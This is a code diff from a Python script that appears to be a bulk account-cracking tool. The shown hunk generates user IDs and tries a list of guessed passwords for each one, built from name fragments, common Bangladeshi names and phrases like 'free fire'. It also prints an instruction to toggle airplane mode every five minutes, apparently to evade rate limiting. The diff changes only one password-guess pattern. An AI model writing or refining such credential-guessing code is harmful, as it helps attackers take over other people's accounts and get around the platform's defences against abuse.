@@ -237,7 +237,7 @@ def xxr():
         print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
         print(f" \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
         for love in user:
-            pwx = [love+kode+code+name+'304050','shakil','saiful','rahman','mamum','Bangladesh','free fire','xxxxxx']
+            pwx = [love+code+name+'304050','shakil','saiful','rahman','mamum','Bangladesh','free fire','xxxxxx']
             uid = code+love
             for Eman in HamiiID:
                 pwx.append(Eman)
